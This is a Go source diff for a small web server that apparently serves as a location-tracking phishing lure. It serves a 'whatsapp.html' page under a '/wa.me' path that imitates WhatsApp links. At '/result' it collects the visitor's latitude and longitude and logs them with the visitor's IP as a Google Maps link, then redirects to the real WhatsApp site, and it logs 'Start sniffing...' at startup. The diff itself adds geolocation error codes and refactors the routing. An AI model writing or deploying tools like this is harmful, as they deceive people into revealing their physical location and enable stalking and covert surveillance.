@@ -16,13 +16,27 @@ const TEMPLATE_NAME string = "whatsapp.html"
 const FINAL_REDIRECTION string = "https://api.whatsapp.com/?lang=en"
 const GMAPS_URL string = "https://google.com/maps/place"
 
+type GeoErrorCode int8
+
+const (
+	SUCCESS           GeoErrorCode = 0
+	PERMISSION_DENIED GeoErrorCode = 1
+	UNAVAILABLE       GeoErrorCode = 2
+	TIMEOUT           GeoErrorCode = 3
+)
+
+type Context struct {
+	done int
+}
+
 type Result struct {
 	status string
 }
 
 type GeoLocationInfo struct {
-	Longitude string `json:"longitude"`
-	Latitude  string `json:"latitude"`
+	Status    GeoErrorCode `json:"status"`
+	Longitude string       `json:"longitude"`
+	Latitude  string       `json:"latitude"`
 }
 
 func (g *GeoLocationInfo) GenerateGMapsURL() string {
@@ -74,8 +88,11 @@ func ResultHandler(response http.ResponseWriter, request *http.Request) {
 		return
 	}
 
-	log.Println("["+request.RemoteAddr+"]", "Result:", geoInfo.GenerateGMapsURL())
+	if geoInfo.Status != SUCCESS {
+		log.Println("["+request.RemoteAddr+"]", "Error Result:", geoInfo.Status)
+	}
 
+	log.Println("["+request.RemoteAddr+"]", "Result:", geoInfo.GenerateGMapsURL())
 	response.WriteHeader(http.StatusOK)
 	fmt.Fprintf(response, "Ok")
 }
@@ -94,11 +111,19 @@ func PrintInto() {
 }
 
 func RunServer() {
+	mux := http.NewServeMux()
+
+	mux.HandleFunc("/wa.me", PageViewHandler)
+	mux.HandleFunc("/redirect", RedirectHandler)
+	mux.HandleFunc("/result", ResultHandler)
+
+	server := &http.Server{
+		Addr:    ":8080",
+		Handler: mux,
+	}
+
 	log.Println("Start sniffing...")
-	http.HandleFunc("/wa.me", PageViewHandler)
-	http.HandleFunc("/redirect", RedirectHandler)
-	http.HandleFunc("/result", ResultHandler)
-	log.Fatal(http.ListenAndServe(":8080", nil))
+	log.Fatal(server.ListenAndServe())
 }
 
 func main() {
